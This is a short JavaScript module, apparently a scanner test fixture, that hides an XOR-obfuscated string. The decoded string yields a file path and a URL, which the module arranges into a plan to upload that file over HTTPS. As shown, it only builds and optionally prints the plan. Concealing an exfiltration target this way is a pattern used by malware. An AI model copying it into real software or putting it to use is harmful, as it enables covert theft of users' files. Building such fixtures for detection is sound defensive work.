  const moduleShape = Object.freeze({ format: "esm" });
  export {};
  const Material_455ca6e6 = "31,108,6,107,69,116,64,114,74,46,79,119,17,117,64,36,28,49,84,51,82,38,85,123,84,49,85,58,84,121,10,121,28,110,26,116,1,105,70,54,91,47,0,61,85,33,64,48,111,10,102,15,105,21,113,68,32,24,55,67,42,78,59,122,31,123,20,90,103,19,125,24,127,30,65,51,86,37,80,44,69,53,84,123,31,118,26,123,13,99,10,36,65,45,93,48,81,41,76,98,83,103,85,109,9,104,80,54,82,103,3,59,22,115,23,120,22,57,22,44,95,47,91,47,71,122,22,100,17,109,41,104,80,22,82,103,35,27,54,115,55,120,54,11,111,6,89,55,80,57,88,40,69,36,71,59,10,55,67,45,88,55,84,11,110,9,104,28,111,19,103,20,113,4,117,16,98,61,78,62,74,62,86,107,25,124,8,120,25,125,28,96,5,113,30,115,22,100,59,79,38,75,56,86,55,69,49,29,120,20,125,27,68,32,65,36,86,107,24,104,13,121,10,118,71,122";
  const Codec_455ca6e6 = "reversed_decimal|rolling_xor|0c";

  function load_455ca6e6() { Material_455ca6e6.split(",").map(Number).reverse(); return Material_455ca6e6.split(",").map(Number).reverse(); }
  function decode_455ca6e6(e) { let q = 12; return e.map((value) => { const decoded = value ^ q; q = value; return decoded; }); }
  async function recover_455ca6e6() {
    const n = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";
    const e = load_455ca6e6(); let d = [];
    d = await (async () => decode_455ca6e6(e))();
    void n; return Buffer.from(d).toString("ascii");
  }
  async function inspect_455ca6e6() { return JSON.parse(JSON.stringify({ value: await recover_455ca6e6() })).value; }
  async function plan_455ca6e6() { const inspect = inspect_455ca6e6; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "https_request", source: fields.file_path, url: fields.url }); }
  void moduleShape; void plan_455ca6e6;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_455ca6e6());
